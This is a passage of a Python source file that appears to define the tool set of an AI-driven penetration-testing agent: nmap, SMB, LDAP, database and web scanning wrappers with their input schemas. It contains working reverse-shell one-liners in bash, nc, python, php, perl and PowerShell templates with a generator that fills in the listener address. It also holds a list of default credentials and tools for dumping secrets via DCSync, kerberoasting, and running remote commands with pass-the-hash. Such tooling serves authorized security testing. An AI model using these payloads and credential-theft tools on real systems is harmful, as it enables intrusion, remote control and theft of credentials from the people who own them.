        header = json.loads(_seg(parts[0]))
        payload = json.loads(_seg(parts[1]))
    except Exception as exc:                            # noqa: BLE001
        raise ValueError(f"could not decode JWT: {exc}")
    out = ["header:  " + json.dumps(header), "payload: " + json.dumps(payload)]
    alg = str(header.get("alg", "")).lower()
    notes = []
    if alg in ("none", ""):
        notes.append("⚠ alg:none — signature not verified (auth bypass)")
    if alg.startswith("hs"):
        notes.append("HMAC — crackable offline if the secret is weak")
    if payload.get("exp"):
        import datetime
        notes.append("exp " + datetime.datetime.utcfromtimestamp(
            int(payload["exp"])).isoformat() + "Z")
    if notes:
        out.append("notes:   " + "; ".join(notes))
    return "\n".join(out)


def _b_data_transform(a):
    import base64
    import codecs
    import urllib.parse
    if "data" not in a:
        raise ValueError("`data` is required")
    data = str(a.get("data"))
    action = (a.get("action") or "decode").lower()
    enc = (a.get("encoding") or "base64").lower()
    if action not in ("encode", "decode"):
        raise ValueError("`action` must be encode or decode")
    if enc not in ("base64", "hex", "url", "rot13"):
        raise ValueError("`encoding` must be base64/hex/url/rot13")
    try:
        if action == "encode":
            r = {"base64": lambda: base64.b64encode(data.encode()).decode(),
                 "hex": lambda: data.encode().hex(),
                 "url": lambda: urllib.parse.quote(data),
                 "rot13": lambda: codecs.encode(data, "rot13")}[enc]()
        else:
            r = {"base64": lambda: base64.b64decode(
                    data + "=" * (-len(data) % 4)).decode("utf-8", "replace"),
                 "hex": lambda: bytes.fromhex(data).decode("utf-8", "replace"),
                 "url": lambda: urllib.parse.unquote(data),
                 "rot13": lambda: codecs.decode(data, "rot13")}[enc]()
    except Exception as exc:                            # noqa: BLE001
        raise ValueError(f"transform failed: {exc}")
    return r


def _b_cidr_expand(a):
    import ipaddress
    try:
        net = ipaddress.ip_network(_word(a, "cidr").strip(), strict=False)
    except Exception as exc:                            # noqa: BLE001
        raise ValueError(f"bad cidr: {exc}")
    hosts = list(net.hosts()) if net.num_addresses > 2 else list(net)
    cap = 2048
    lines = [f"{net} — {net.num_addresses} addresses, {len(hosts)} usable hosts"]
    lines += [str(h) for h in hosts[:cap]]
    if len(hosts) > cap:
        lines.append(f"… (+{len(hosts) - cap} more, capped)")
    return "\n".join(lines)


def _b_ip_info(a):
    import ipaddress
    try:
        obj = ipaddress.ip_address(_word(a, "ip").strip())
    except Exception as exc:                            # noqa: BLE001
        raise ValueError(f"bad ip: {exc}")
    flags = [attr[3:] for attr in ("is_private", "is_loopback", "is_link_local",
                                   "is_multicast", "is_reserved", "is_global")
             if getattr(obj, attr)]
    return f"{obj} — IPv{obj.version}; {', '.join(flags) or 'unspecified'}"


_SHELL_TEMPLATES = {
    "bash": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "nc_mkfifo": "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|"
                 "nc {lhost} {lport} >/tmp/f",
    "python": "python3 -c 'import socket,subprocess,os;s=socket.socket();"
              "s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];"
              "subprocess.call([\"/bin/sh\",\"-i\"])'",
    "php": "php -r '$s=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "perl": "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,"
            "getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));"
            "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
    "powershell": "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('{lhost}',"
                  "{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read("
                  "$b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString("
                  "$b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';"
                  "$sy=([Text.Encoding]::ASCII).GetBytes($sb2);$s.Write($sy,0,$sy.Length);"
                  "$s.Flush()}\"",
}


def _b_payload_gen(a):
    lhost = _word(a, "lhost").strip()
    if not _HOST_RE.match(lhost):
        raise ValueError("`lhost` must be an IP/host")
    try:
        lport = int(a.get("lport"))
    except (TypeError, ValueError):
        raise ValueError("`lport` is required (a port number)")
    if not 1 <= lport <= 65535:
        raise ValueError("`lport` must be 1-65535")
    kind = (a.get("type") or "bash").lower()
    if kind not in _SHELL_TEMPLATES:
        raise ValueError("`type` must be one of " + ", ".join(_SHELL_TEMPLATES))
    payload = _SHELL_TEMPLATES[kind].format(lhost=lhost, lport=lport)
    return (f"# reverse shell — {kind} (generated, NOT executed)\n{payload}\n\n"
            f"# start a listener first:\nnc -lvnp {lport}")


_DEFAULT_CREDS = {
    "tomcat": ["tomcat:tomcat", "admin:admin", "tomcat:s3cret", "role1:role1"],
    "jenkins": ["admin:admin"], "grafana": ["admin:admin"], "jboss": ["admin:admin"],
    "weblogic": ["weblogic:welcome1", "system:password"], "phpmyadmin": ["root:"],
    "mysql": ["root:", "root:root", "root:toor"], "postgres": ["postgres:postgres"],
    "mssql": ["sa:", "sa:sa"], "oracle": ["system:manager", "sys:change_on_install"],
    "rabbitmq": ["guest:guest"], "elasticsearch": ["elastic:changeme"],
    "gitlab": ["root:5iveL!fe"], "router": ["admin:admin", "admin:password"],
    "ssh": ["root:root", "root:toor"], "ftp": ["anonymous:anonymous", "ftp:ftp"],
    "vnc": ["<no-user>:password"], "mongodb": ["<often no auth>"],
    "redis": ["<often no auth>"], "cisco": ["cisco:cisco", "admin:admin"],
    "printer": ["admin:", "admin:admin"], "webmin": ["admin:admin"],
}


def _b_default_creds(a):
    q = _word(a, "product").strip().lower()
    hits = {k: v for k, v in _DEFAULT_CREDS.items() if k in q or q in k}
    if not hits:
        return (f"no bundled default creds for '{q}'. Try the vendor docs or "
                "SecLists/Passwords/Default-Credentials.")
    return "\n".join(f"{k}: " + ", ".join(v) for k, v in hits.items())


def _ver_key(v):
    return tuple(int(x) for x in re.findall(r"\d+", v or ""))


def _b_cve_lookup(a):
    import sqlite3
    vendor = _word(a, "vendor").strip().lower()
    product = _word(a, "product").strip().lower()
    version = _word(a, "version").strip()
    if not re.search(r"\d", version):
        raise ValueError("`version` must contain a number")
    path = os.path.join(_ROOT, "appdata", "cve_index.db")
    if not os.path.exists(path):
        return ("[no index] appdata/cve_index.db is not present (built by the "
                "installer from NVD).", True)
    try:
        con = sqlite3.connect(path)
        rows = con.execute(
            "SELECT m.exact_ver, m.vsi, m.vse, m.vei, m.vee, m.cve FROM cve_match m "
            "JOIN product p ON p.id = m.product_id WHERE p.vendor=? AND p.product=?",
            (vendor, product)).fetchall()
        con.close()
    except sqlite3.Error as exc:
        return (f"index query failed: {exc}", True)
    vk = _ver_key(version)
    matched = set()
    for exact, vsi, vse, vei, vee, cve in rows:
        if exact:
            ek = _ver_key(exact)
            if len(vk) >= len(ek) and vk[:len(ek)] == ek:
                matched.add(cve)
        elif len(vk) >= 2 and (vsi or vse) and (vei or vee):   # closed range only
            def _ge(b):
                return not b or vk >= _ver_key(b)

            def _le(b):
                return not b or vk <= _ver_key(b)
            if _ge(vsi) and _le(vei) and (not vse or vk > _ver_key(vse)) \
                    and (not vee or vk < _ver_key(vee)):
                matched.add(cve)
    if not matched:
        return f"{product} {version}: no CVEs matched the index (strict version match)."
    kev = set()
    try:
        with open(os.path.join(_ROOT, "appdata", "kev.txt"), encoding="utf-8") as fh:
            kev = {ln.strip() for ln in fh if ln.startswith("CVE-")}
    except OSError:
        pass
    order = sorted(matched, key=lambda c: tuple(-int(x) for x in re.findall(r"\d+", c)))
    k = [c for c in order if c in kev]
    o = [c for c in order if c not in kev]
    out = [f"{product} {version} — {len(k)} KEV (known-exploited), {len(o)} other"]
    if k:
        out.append("KEV: " + ", ".join(k[:20]))
    if o:
        out.append("other: " + ", ".join(o[:20]) + (" …" if len(o) > 20 else ""))
    return "\n".join(out)


def _b_tls_analyze(a):
    import socket
    import ssl
    host, port = _req_host(a), _port(a, 443)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with socket.create_connection((host, port), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ss:
                ver, cipher = ss.version(), ss.cipher()
    except Exception as exc:                            # noqa: BLE001
        return (f"TLS connect to {host}:{port} failed: {exc}", True)
    note = ""
    if ver in ("SSLv3", "TLSv1", "TLSv1.1"):
        note = "  ⚠ obsolete protocol"
    return (f"{host}:{port}\nprotocol: {ver}{note}\ncipher: {cipher[0]} "
            f"({cipher[2]} bits)")


def _b_robots_sitemap(a):
    import ssl
    import urllib.request
    base = _req_url(a).rstrip("/")
    unverified = ssl._create_unverified_context()
    out = []
    for path in ("/robots.txt", "/sitemap.xml"):
        try:
            req = urllib.request.Request(base + path,
                                         headers={"User-Agent": "Mozilla/5.0"})
            body = urllib.request.urlopen(req, timeout=15,
                                          context=unverified).read(20000)
            out.append(f"== {path} ==\n" + body.decode("utf-8", "replace").strip())
        except Exception as exc:                        # noqa: BLE001
            out.append(f"== {path} == (not available: {exc})")
    return "\n\n".join(out)


# name -> (builder, description, inputSchema)
_H = {"type": "string", "description": "Target host — a single IP or hostname "
      "(no CIDR/subnet)."}
_PORT = {"type": "integer", "description": "TCP port (1-65535)."}
_PORTS = {"type": "string", "description": "Ports, e.g. 80 or 22,80,443 or 1-1024. "
          "Omit for the top 1000."}
# shared tuning knobs, on every nmap-based scan tool:
_TIMING = {"type": "string", "description": "nmap timing T0-T5 (default T4; lower is "
           "slower/stealthier for filtered or laggy hosts)."}
_HOSTDISC = {"type": "boolean", "description": "false (default) uses -Pn (assume up); "
             "true lets nmap ping the host first."}
# shared credential fields (passed on the command line — authorized testing only):
_USER = {"type": "string", "description": "Username (omit for null/anonymous where "
         "the service allows it)."}
_PASS = {"type": "string", "description": "Password."}
_HASH = {"type": "string", "description": "NT hash (or LM:NT) for pass-the-hash, "
         "instead of a password."}
_DOMAIN = {"type": "string", "description": "AD domain / workgroup (optional)."}

HACKTOOLS = {
    "port_discovery": (
        _b_port_discovery,
        "Discover open ports on a host. Give just `host` for a fast top-1000 TCP scan; "
        "the options let you widen the range (low/high/full), scan UDP, slow the "
        "timing, or enable host discovery when -Pn is being dropped. Read-only.",
        {"type": "object", "properties": {
            "host": _H,
            "range": {"type": "string", "description": "Port set: fast (top 1000, "
                      "default) · top100 · low (1-32767) · high (32768-65535) · "
                      "full (1-65535)."},
            "ports": {"type": "string", "description": "Explicit ports (e.g. "
                      "22,80,443 or 1-1024) — overrides `range`."},
            "protocol": {"type": "string", "description": "tcp (default) · udp · "
                         "both. udp/both need root."},
            "timing": {"type": "string", "description": "nmap timing T0-T5 (default "
                       "T4; lower is slower/stealthier for filtered or laggy hosts)."},
            "host_discovery": {"type": "boolean", "description": "false (default) "
                               "uses -Pn (assume up); true lets nmap ping first."}},
         "required": ["host"]}),
    "service_discovery": (
        _b_service_discovery,
        "Fingerprint the services/versions behind a host's open ports (nmap -sV, plus "
        "default -sC scripts). Give just `host`; options let you pick ports, scan "
        "UDP, toggle scripts, tune version intensity, add OS detection, or slow the "
        "timing. Usually run on the open ports from port_discovery.",
        {"type": "object", "properties": {
            "host": _H,
            "ports": {"type": "string", "description": "Ports to fingerprint (e.g. "
                      "22,80,443). Omit for the top 1000 — usually the open ports "
                      "from port_discovery."},
            "protocol": {"type": "string", "description": "tcp (default) · udp · "
                         "both. udp/both need root."},
            "scripts": {"type": "boolean", "description": "Run default NSE scripts "
                        "-sC (default true). false = -sV only (faster/quieter)."},
            "intensity": {"type": "integer", "description": "Version-probe intensity "
                          "0-9 (nmap default 7; lower is faster/lighter)."},
            "os": {"type": "boolean", "description": "Also detect the OS (-O, needs "
                   "root). Default false."},
            "timing": {"type": "string", "description": "nmap timing T0-T5 (default "
                       "T4; lower is slower/stealthier)."},
            "host_discovery": {"type": "boolean", "description": "false (default) "
                               "uses -Pn (assume up); true lets nmap ping first."}},
         "required": ["host"]}),
    "script_scan": (
        _b_script_scan,
        "Run specific nmap NSE scripts against a host (e.g. 'http-title,http-methods' "
        "or 'smb-vuln-ms17-010'). brute/dos/exploit scripts are rejected.",
        {"type": "object", "properties": {
            "host": _H, "ports": _PORTS,
            "scripts": {"type": "string", "description": "Comma-separated NSE script "
                        "names or a safe wildcard like 'smb-vuln-*'."},
            "timing": _TIMING, "host_discovery": _HOSTDISC},
         "required": ["host", "scripts"]}),
    "http_headers": (
        _b_http_headers,
        "Fetch a web server's HTTP response headers (curl). Reveals server/tech "
        "banners, cookies and redirects; can target a path and follow redirects.",
        {"type": "object", "properties": {
            "host": _H, "port": _PORT,
            "tls": {"type": "boolean", "description": "Use https (default: http, or "
                    "https on 443/8443)."},
            "path": {"type": "string", "description": "Request path (default '/'), "
                     "e.g. /admin or /api."},
            "method": {"type": "string", "description": "head (default, -I) or get "
                       "(headers of a GET)."},
            "follow_redirects": {"type": "boolean", "description": "Follow 3xx "
                                 "redirects (-L). Default false."},
            "user_agent": {"type": "string", "description": "Custom User-Agent "
                           "header."}},
         "required": ["host"]}),
    "ftp_anon": (
        _b_ftp_anon,
        "Check whether anonymous FTP login is allowed and list the root (nmap "
        "ftp-anon).",
        {"type": "object", "properties": {
            "host": _H, "port": _PORT, "timing": _TIMING,
            "host_discovery": _HOSTDISC}, "required": ["host"]}),
    "smb_enum": (
        _b_smb_enum,
        "Enumerate SMB with a null session: OS, signing, shares and users (nmap smb-* "
        "scripts).",
        {"type": "object", "properties": {
            "host": _H, "timing": _TIMING, "host_discovery": _HOSTDISC},
         "required": ["host"]}),
    "snmp_walk": (
        _b_snmp_walk,
        "Walk SNMP with a community string (default 'public') to dump system info. "
        "Can target a starting OID subtree and pick the SNMP version/port.",
        {"type": "object", "properties": {
            "host": _H,
            "community": {"type": "string", "description": "SNMP community "
                          "(default: public)."},
            "version": {"type": "string", "description": "SNMP version: 1 or 2c "
                        "(default 2c)."},
            "oid": {"type": "string", "description": "Start OID/subtree, e.g. "
                    "1.3.6.1.2.1.1 (system). Omit to walk from the top."},
            "port": {"type": "integer", "description": "SNMP UDP port (default 161)."}},
         "required": ["host"]}),
    "dns_lookup": (
        _b_dns,
        "Resolve a DNS record (dig +short). Supports A/AAAA/MX/NS/TXT/CNAME/SOA/PTR "
        "and can query a specific resolver.",
        {"type": "object", "properties": {
            "name": {"type": "string", "description": "Domain or host to resolve."},
            "type": {"type": "string", "description": "Record type (default A)."},
            "server": {"type": "string", "description": "Resolver to query (@server), "
                       "e.g. the target's own DNS. Default: system resolver."}},
         "required": ["name"]}),
    "ssl_cert": (
        _b_ssl_cert,
        "Read a TLS service's certificate — subject, SANs, validity (nmap ssl-cert).",
        {"type": "object", "properties": {
            "host": _H, "port": _PORT, "timing": _TIMING,
            "host_discovery": _HOSTDISC}, "required": ["host"]}),
    "banner_grab": (
        _b_banner,
        "Grab the service banner on one port (nmap -sV + banner).",
        {"type": "object", "properties": {
            "host": _H, "port": _PORT, "timing": _TIMING,
            "host_discovery": _HOSTDISC}, "required": ["host", "port"]}),
    "searchsploit": (
        _b_searchsploit,
        "Search the local Exploit-DB copy (searchsploit) by product/version, by CVE, "
        "or title-only. Returns known public exploits — leads, not proof.",
        {"type": "object", "properties": {
            "query": {"type": "string", "description": "e.g. 'vsftpd 2.3.4' or "
                      "'apache 2.4'. Optional if `cve` is given."},
            "cve": {"type": "string", "description": "Search by CVE, e.g. "
                    "CVE-2021-3156 or 2021-3156."},
            "title": {"type": "boolean", "description": "Match the exploit title only "
                      "(-t) — fewer false matches. Default false."}},
         "required": []}),
    "whois": (
        _b_whois,
        "WHOIS registration info for a domain or IP; can target a specific WHOIS "
        "server.",
        {"type": "object", "properties": {
            "domain": {"type": "string", "description": "Domain name or IP."},
            "server": {"type": "string", "description": "WHOIS server to query (-h). "
                       "Default: whois picks it."}},
         "required": ["domain"]}),
    "http_request": (
        _b_http_request,
        "Make an arbitrary HTTP request with curl and return the status, headers and "
        "body. Set method, headers, body, cookie, basic-auth or a bearer token — good "
        "for probing endpoints and testing APIs with credentials from the engagement. "
        "(Credentials are passed on the command line.)",
        {"type": "object", "properties": {
            "url": {"type": "string", "description": "Full http(s) URL, e.g. "
                    "http://10.0.0.5:8080/api/users."},
            "method": {"type": "string", "description": "GET (default), POST, PUT, "
                       "DELETE, HEAD, OPTIONS, PATCH."},
            "headers": {"type": "array", "items": {"type": "string"},
                        "description": "Extra headers, each 'Name: value'."},
            "data": {"type": "string", "description": "Request body (for POST/PUT)."},
            "cookie": {"type": "string", "description": "Cookie header value."},
            "username": {"type": "string", "description": "HTTP basic-auth username."},
            "password": {"type": "string", "description": "HTTP basic-auth password."},
            "bearer": {"type": "string", "description": "Bearer token (Authorization "
                       "header)."},
            "follow_redirects": {"type": "boolean", "description": "Follow 3xx (-L)."},
            "user_agent": {"type": "string", "description": "Custom User-Agent."}},
         "required": ["url"]}),
    "web_content_discovery": (
        _b_web_content,
        "Brute-force web directories and files with ffuf against a URL (put FUZZ where "
        "the word goes, or just give the base URL). Picks a preset wordlist and "
        "reports found paths with their status codes.",
        {"type": "object", "properties": {
            "url": {"type": "string", "description": "Base URL (FUZZ appended) or a "
                    "URL containing FUZZ, e.g. http://host/FUZZ."},
            "wordlist": {"type": "string", "description": "Preset: common (default), "
                         "medium, big, raft."},
            "extensions": {"type": "string", "description": "Extensions to append, "
                           "e.g. php,txt,html."},
            "threads": {"type": "integer", "description": "Concurrency 1-100 "
                        "(default 40)."}},
         "required": ["url"]}),
    "whatweb": (
        _b_whatweb,
        "Fingerprint a website's stack — server, CMS, frameworks, libraries and their "
        "versions (whatweb).",
        {"type": "object", "properties": {
            "url": {"type": "string", "description": "Full http(s) URL."},
            "aggression": {"type": "integer", "description": "Aggression 1 (passive) "
                           "to 4 (heavy). Default whatweb's."}},
         "required": ["url"]}),
    "nikto_scan": (
        _b_nikto,
        "Scan a web server for known issues, dangerous files and misconfigurations "
        "(nikto). Noisy — an active vulnerability scan.",
        {"type": "object", "properties": {
            "host": _H, "port": _PORT,
            "tls": {"type": "boolean", "description": "Use https (auto on 443/8443)."}},
         "required": ["host"]}),
    "nuclei_scan": (
        _b_nuclei,
        "Run nuclei's community templates against a URL to find CVEs, exposures and "
        "misconfigurations. Filter by severity or tags to keep it focused.",
        {"type": "object", "properties": {
            "url": {"type": "string", "description": "Full http(s) URL, e.g. "
                    "http://10.0.0.5."},
            "severity": {"type": "string", "description": "Comma list: info,low,"
                         "medium,high,critical."},
            "tags": {"type": "string", "description": "Template tags, e.g. cve,"
                     "exposure,wordpress."}},
         "required": ["url"]}),
    "smb_client": (
        _b_smb_client,
        "List SMB shares, or list a share's contents, with smbclient. Works with a "
        "null session or credentials (password or NT hash).",
        {"type": "object", "properties": {
            "host": _H,
            "action": {"type": "string", "description": "list (shares, default) or ls "
                       "(a share's files)."},
            "share": {"type": "string", "description": "Share name (required for ls)."},
            "path": {"type": "string", "description": "Path inside the share for ls "
                     "(default root)."},
            "username": _USER, "password": _PASS, "hash": _HASH, "domain": _DOMAIN},
         "required": ["host"]}),
    "netexec_smb": (
        _b_nxc_smb,
        "Enumerate or act on SMB with netexec (nxc): shares, users, groups, rid-brute, "
        "sessions, disks, logged-on users, password policy — or exec a single command "
        "(needs admin). Null session or credentials (password/NT hash).",
        {"type": "object", "properties": {
            "host": _H,
            "action": {"type": "string", "description": "shares (default) · users · "
                       "groups · rid · sessions · disks · loggedon · passpol · exec."},
            "command": {"type": "string", "description": "Command to run when "
                        "action=exec (single command via SMB)."},
            "username": _USER, "password": _PASS, "hash": _HASH, "domain": _DOMAIN},
         "required": ["host"]}),
    "ldap_search": (
        _b_ldap_search,
        "Query LDAP / Active Directory with ldapsearch — users, groups, computers, any "
        "attributes. Anonymous or authenticated bind.",
        {"type": "object", "properties": {
            "host": _H, "port": _PORT,
            "base_dn": {"type": "string", "description": "Search base, e.g. "
                        "DC=corp,DC=local."},
            "filter": {"type": "string", "description": "LDAP filter (default "
                       "(objectClass=*)), e.g. (objectClass=user)."},
            "attributes": {"type": "string", "description": "Comma-separated attrs to "
                           "return, e.g. sAMAccountName,description."},
            "username": _USER, "password": _PASS, "domain": _DOMAIN},
         "required": ["host"]}),
    "rpc_enum": (
        _b_rpc_enum,
        "Enumerate a Windows host over MSRPC with rpcclient (users, groups, domain "
        "info). Null session or credentials.",
        {"type": "object", "properties": {
            "host": _H,
            "commands": {"type": "string", "description": "Semicolon rpcclient "
                         "commands (default enumdomusers;enumdomgroups;querydominfo)."},
            "username": _USER, "password": _PASS, "domain": _DOMAIN},
         "required": ["host"]}),
    "secretsdump": (
        _b_secretsdump,
        "Dump secrets from a host with impacket-secretsdump — SAM/LSA/cached creds, or "
        "DCSync the domain (just_dc) with DC credentials. Requires credentials "
        "(password or NT hash).",
        {"type": "object", "properties": {
            "host": _H,
            "username": _USER, "password": _PASS, "hash": _HASH, "domain": _DOMAIN,
            "just_dc": {"type": "boolean", "description": "DCSync only (-just-dc) — "
                        "domain hashes via a DC, faster."}},
         "required": ["host", "username"]}),
    "impacket_exec": (
        _b_impacket_exec,
        "Run ONE command on a Windows host with valid credentials via impacket "
        "(wmiexec/psexec/smbexec/atexec). Not an interactive shell. Password or NT "
        "hash.",
        {"type": "object", "properties": {
            "host": _H,
            "method": {"type": "string", "description": "wmiexec (default) · psexec · "
                       "smbexec · atexec."},
            "command": {"type": "string", "description": "The single command to run, "
                        "e.g. 'whoami /all'."},
            "username": _USER, "password": _PASS, "hash": _HASH, "domain": _DOMAIN},
         "required": ["host", "username", "command"]}),
    "kerberos_roast": (
        _b_kerberos_roast,
        "Request Kerberos hashes for offline cracking: kerberoast (SPN accounts, needs "
        "creds) or asrep (AS-REP-roastable accounts; a single target_user works with "
        "no creds). Needs the DC and domain.",
        {"type": "object", "properties": {
            "dc": {"type": "string", "description": "Domain controller host/IP."},
            "domain": {"type": "string", "description": "AD domain, e.g. corp.local."},
            "mode": {"type": "string", "description": "kerberoast (default) or asrep."},
            "target_user": {"type": "string", "description": "For asrep without creds "
                            "— a username to test."},
            "username": _USER, "password": _PASS, "hash": _HASH},
         "required": ["dc", "domain"]}),
    "mysql_query": (
        _b_mysql_query,
        "Run a SQL query against MySQL/MariaDB (mysql client). Credentials are passed "
        "on the command line.",
        {"type": "object", "properties": {
            "host": _H, "port": _PORT,
            "username": {"type": "string", "description": "DB user (default root)."},
            "password": _PASS,
            "database": {"type": "string", "description": "Database to use (optional)."},
            "query": {"type": "string", "description": "SQL to run, e.g. "
                      "'show databases;'."}},
         "required": ["host", "query"]}),
    "mssql_query": (
        _b_mssql_query,
        "Run a SQL query against MS SQL Server via netexec (nxc mssql). Windows auth by "
        "default; set local_auth for a SQL login. Password or NT hash.",
        {"type": "object", "properties": {
            "host": _H, "port": _PORT,
            "username": _USER, "password": _PASS, "hash": _HASH, "domain": _DOMAIN,
            "local_auth": {"type": "boolean", "description": "Use a SQL login instead "
                           "of Windows auth."},
            "query": {"type": "string", "description": "SQL to run."}},
         "required": ["host", "query"]}),
    "psql_query": (
        _b_psql_query,
        "Run a SQL query against PostgreSQL (psql). Credentials are passed in the "
        "connection URI.",
        {"type": "object", "properties": {
            "host": _H, "port": _PORT,
            "username": {"type": "string", "description": "DB user (default "
                         "postgres)."},
            "password": _PASS,
            "database": {"type": "string", "description": "Database (default "
                         "postgres)."},
            "query": {"type": "string", "description": "SQL to run."}},
         "required": ["host", "query"]}),
    "redis_cli": (
        _b_redis_cli,
        "Run a Redis command (redis-cli). No-auth or with a password. Destructive "
        "flush/shutdown commands are blocked.",
        {"type": "object", "properties": {
            "host": _H, "port": _PORT, "password": _PASS,
            "command": {"type": "string", "description": "Redis command (default "
                        "INFO), e.g. 'KEYS *' or 'GET foo'."}},
         "required": ["host"]}),
    "mongo_query": (
        _b_mongo_query,
        "Run a MongoDB command with mongosh --eval. Anonymous or with credentials.",
        {"type": "object", "properties": {
            "host": _H, "port": _PORT,
            "username": _USER, "password": _PASS,
            "database": {"type": "string", "description": "Database (default admin)."},
            "command": {"type": "string", "description": "JS to eval (default lists "
                        "databases), e.g. 'db.users.find()'."}},
         "required": ["host"]}),
    "ssh_exec": (
        _b_ssh_exec,
        "Run ONE command over SSH with a password (via sshpass) or a private key. Not "
        "an interactive shell.",
        {"type": "object", "properties": {
            "host": _H, "port": _PORT,
            "username": {"type": "string", "description": "SSH username."},
            "password": _PASS,
            "key": {"type": "string", "description": "Path to a private key (instead "
                    "of a password)."},
            "command": {"type": "string", "description": "The command to run, e.g. "
                        "'id; uname -a'."}},
         "required": ["host", "username", "command"]}),
    "winrm_exec": (
        _b_winrm_exec,
        "Run ONE command on Windows over WinRM via netexec (nxc winrm). Password or NT "
        "hash. Not an interactive shell.",
        {"type": "object", "properties": {
            "host": _H,
            "username": _USER, "password": _PASS, "hash": _HASH, "domain": _DOMAIN,
            "command": {"type": "string", "description": "The command to run, e.g. "
                        "'whoami /all'."}},
         "required": ["host", "username", "command"]}),
    "ftp_transfer": (
        _b_ftp_transfer,
        "List an FTP directory or download a file to stdout (curl). Anonymous or with "
        "credentials.",
        {"type": "object", "properties": {
            "host": _H, "port": _PORT,
            "username": {"type": "string", "description": "FTP user (default "
                         "anonymous)."},
            "password": _PASS,
            "action": {"type": "string", "description": "list (a directory) or get "
                       "(print a file)."},
            "path": {"type": "string", "description": "Directory or file path "
                     "(default /)."}},
         "required": ["host"]}),
    "subdomain_enum": (
        _b_subdomain_enum,
        "Passively enumerate a domain's subdomains with subfinder (OSINT sources, no "
        "traffic to the target).",
        {"type": "object", "properties": {
            "domain": {"type": "string", "description": "Root domain, e.g. "
                       "example.com."}},
         "required": ["domain"]}),
    "dns_zone_transfer": (
        _b_dns_zone_transfer,
        "Attempt a DNS zone transfer (AXFR) against a name server — dumps every record "
        "if the NS allows it.",
        {"type": "object", "properties": {
            "domain": {"type": "string", "description": "Domain / zone, e.g. "
                       "example.com."},
            "nameserver": {"type": "string", "description": "Name server host/IP to "
                           "try the AXFR against."}},
         "required": ["domain", "nameserver"]}),
    "traceroute": (
        _b_traceroute,
        "Trace the network path to a host. UDP by default; ICMP/TCP need root.",
        {"type": "object", "properties": {
            "host": _H,
            "max_hops": {"type": "integer", "description": "Max hops 1-64 (default "
                         "30)."},
            "protocol": {"type": "string", "description": "udp (default) · icmp · tcp "
                         "(icmp/tcp need root)."}},
         "required": ["host"]}),
    "vhost_fuzz": (
        _b_vhost_fuzz,
        "Discover virtual hosts on a web server by fuzzing the Host header with ffuf "
        "(auto-calibrated to drop the default response).",
        {"type": "object", "properties": {
            "url": {"type": "string", "description": "Web server URL, e.g. "
                    "http://10.0.0.5."},
            "domain": {"type": "string", "description": "Base domain for the Host "
                       "header (FUZZ.<domain>), e.g. example.com."},
            "wordlist": {"type": "string", "description": "small (default) · large · "
                         "common."}},
         "required": ["url", "domain"]}),
    "hash_identify": (
        _b_hash_identify,
        "Identify the likely type(s) of a password hash from the hash string (length, "
        "charset and prefix heuristics). Useful after dumping hashes.",
        {"type": "object", "properties": {
            "hash": {"type": "string", "description": "The hash string, e.g. an "
                     "NT hash or $6$… crypt."}},
         "required": ["hash"]}),
    "jwt_decode": (
        _b_jwt_decode,
        "Decode a JWT's header and payload (no verification) and flag weaknesses like "
        "alg:none or a crackable HMAC secret.",
        {"type": "object", "properties": {
            "token": {"type": "string", "description": "The JWT (header.payload."
                      "signature)."}},
         "required": ["token"]}),
    "data_transform": (
        _b_data_transform,
        "Encode or decode a string as base64, hex, URL or rot13.",
        {"type": "object", "properties": {
            "data": {"type": "string", "description": "The input string."},
            "action": {"type": "string", "description": "decode (default) or encode."},
            "encoding": {"type": "string", "description": "base64 (default) · hex · "
                         "url · rot13."}},
         "required": ["data"]}),
    "cidr_expand": (
        _b_cidr_expand,
        "Expand a CIDR/subnet to its list of host addresses (capped).",
        {"type": "object", "properties": {
            "cidr": {"type": "string", "description": "e.g. 10.0.0.0/24 or "
                     "192.168.1.0/28."}},
         "required": ["cidr"]}),
    "ip_info": (
        _b_ip_info,
        "Classify an IP address — version, private/public, loopback, link-local, etc.",
        {"type": "object", "properties": {
            "ip": {"type": "string", "description": "IPv4 or IPv6 address."}},
         "required": ["ip"]}),
    "payload_gen": (
        _b_payload_gen,
        "Generate a reverse-shell one-liner (bash/nc/python/php/perl/powershell) for a "
        "listener, plus the nc listener command. Generated only — NOT executed.",
        {"type": "object", "properties": {
            "lhost": {"type": "string", "description": "Your listener IP."},
            "lport": {"type": "integer", "description": "Your listener port."},
            "type": {"type": "string", "description": "bash (default) · nc_mkfifo · "
                     "python · php · perl · powershell."}},
         "required": ["lhost", "lport"]}),
    "default_creds": (
        _b_default_creds,
        "Look up common default credentials for a product/service from a bundled list.",
        {"type": "object", "properties": {
            "product": {"type": "string", "description": "Product/service, e.g. "
                        "tomcat, jenkins, grafana, mysql."}},
         "required": ["product"]}),
    "cve_lookup": (
        _b_cve_lookup,
        "Look up known CVEs for a product/version against the offline NVD index and "
        "split them into KEV (known-exploited) vs other. Strict version matching.",
        {"type": "object", "properties": {
            "vendor": {"type": "string", "description": "NVD vendor, e.g. openbsd, "
                       "apache, samba."},
            "product": {"type": "string", "description": "NVD product, e.g. openssh, "
                        "http_server, samba."},
            "version": {"type": "string", "description": "Version, e.g. 7.2 or "
                        "2.4.66."}},
         "required": ["vendor", "product", "version"]}),
    "tls_analyze": (
        _b_tls_analyze,
        "Connect to a TLS service and report the negotiated protocol and cipher, "
        "flagging obsolete SSL/TLS versions.",
        {"type": "object", "properties": {"host": _H, "port": _PORT},
         "required": ["host"]}),
    "robots_sitemap": (
        _b_robots_sitemap,
